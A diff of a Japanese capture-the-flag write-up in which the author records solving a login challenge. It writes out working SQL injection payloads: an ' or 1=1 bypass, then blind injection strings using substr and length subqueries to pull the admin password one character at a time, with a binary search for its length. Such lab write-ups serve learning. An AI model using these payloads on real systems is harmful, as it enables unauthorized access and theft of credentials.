@@ -1,3 +1,5 @@
+自力解答ならず。  
+
 ``ID``に``admin``、``Pass``に``' or 1=1;--``を入力して送信。  
 ヒントが表示される。  
 
@@ -59,3 +61,42 @@
   </body>
 </html>
 ```
+
+ここで詰まる。  
+
+### 正解
+
+Blind SQL Injection。SQLの結果の違いから正解を絞り込んでいく手法。徳丸本とかで見たことはあるけど、自分で実践するのは初めて。  
+
+まずパスワードの先頭が``FLAG_``の形式になっているかを調べる。ちなみに``substr``の第二引数は1-indexed。  
+
+```
+' or substr((select pass from user where id = 'admin'), 1, 1) = 'F'; --
+' or substr((select pass from user where id = 'admin'), 2, 1) = 'L'; --
+' or substr((select pass from user where id = 'admin'), 3, 1) = 'A'; --
+' or substr((select pass from user where id = 'admin'), 4, 1) = 'G'; --
+' or substr((select pass from user where id = 'admin'), 5, 1) = '_'; --
+```
+
+上記のすべてで``Congratulations!``。パスワードは``FLAG_xxx``の形式で確定。  
+
+次にパスワードの文字数を調べる。以下を``ID``欄に打ち込む。``Congratulations!``。  
+
+```
+' or (select length(pass) from user where id = 'admin') > 1;--
+```
+
+次は以下。``Login Failed``。  
+
+```
+' or (select length(pass) from user where id = 'admin') > 100;--
+```
+
+後は二分探索。``> 20``だと``Congratulations!``で``> 21``だと``Login Failed``だったので、パスワードは21文字。  
+
+``FLAG_``の分を抜いた残りの16文字は総当たり。  
+
+### 参考
+
+- [SQLite Substr | SQLITE TUTORIAL](https://www.sqlitetutorial.net/sqlite-functions/sqlite-substr/)
+- [Blind SQL injection | PortSwigger](https://portswigger.net/web-security/sql-injection/blind)
